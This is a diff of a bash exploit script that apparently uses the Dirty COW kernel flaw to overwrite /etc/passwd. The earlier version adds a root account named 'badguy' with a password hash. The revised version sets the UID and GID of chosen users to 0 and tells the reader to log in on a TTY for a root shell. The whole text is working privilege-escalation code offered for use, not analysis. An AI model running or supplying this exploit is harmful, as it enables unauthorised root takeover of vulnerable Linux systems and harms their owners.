@@ -1,8 +1,62 @@
 #!/bin/bash
 #
-# Edit /etc/passwd to create a root account with credentials "badguy:badguy".
+# Edit /etc/passwd to give user(s) root privileges.
+#
+# If arguments are passed, they are taken as users to escalate. Otherwise, $USER
+# is assumed instead.
+#
+# This will likely make the X session unstable if used on the current user.
+# By editing the user's UID in /etc/passwd, many things that check the user's
+# UID (e.g., sudo) will fail. Because of this, the unmodified version of
+# /etc/passwd is backed up to $HOME before performing the exploit.
+#
+# After running this script, switch to a TTY and log in as the user(s)
+# to gain a root shell.
 
 . "$(dirname "$0")/common.sh"
 
 backup /etc/passwd "$HOME/passwd"
-dirtycow -a -s "badguy:5/tk2PeameNik:0:0:root:/root:/bin/bash" /etc/passwd
+
+escalate_user() {
+	local user="$1"
+	local offset="$(grep --byte-offset "^$user" /etc/passwd | cut --delimiter=':' --fields=1)"
+
+	awk -v FS=':' -v user="$user" '
+			BEGIN {
+				root_uid = 0;
+	
+				# indices of important fields in /etc/passwd
+				i_uid = 3;
+				i_guid = 4;
+				i_comment = 5;
+			}
+	
+			$0 ~ "^"user {
+				for (i = 1; i <= i_comment; ++i) {
+					if (i < i_uid) {
+						printf $i;
+					} else if (i == i_uid || i == i_guid) {
+						padding += length($i) - length(root_uid);
+						printf root_uid;
+					} else {
+						printf $i;
+	
+						# pad comment to line up with old end of comment
+						for (n = 0; n < padding; ++n) {
+							printf " ";
+						}
+					}
+	
+					printf FS;
+				}
+			}' /etc/passwd \
+		| dirtycow -o "$offset" /etc/passwd
+}
+
+if [ $# -eq 0 ]; then
+	escalate_user "$USER"
+else
+	for user in $@; do
+		escalate_user "$user"
+	done
+fi
